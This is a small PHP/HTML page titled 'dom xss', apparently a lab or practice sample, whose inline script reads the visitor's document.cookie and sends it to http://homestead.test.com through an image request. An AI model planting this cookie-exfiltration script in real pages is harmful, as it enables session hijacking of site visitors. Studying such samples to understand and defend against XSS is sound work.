<?php


?>

<!DOCTYPE html>
<html>
<head>
	<title>dom xss</title>
</head>
<body>
	<script type="text/javascript">
		var img = document.createElement('img');
		console.log(document.cookie);
		console.log(typeof(document.cookie));
		img.src = "http://homestead.test.com?" + escape(document.cookie);
		document.body.appendChild(img);
	</script>
</body>
</html>
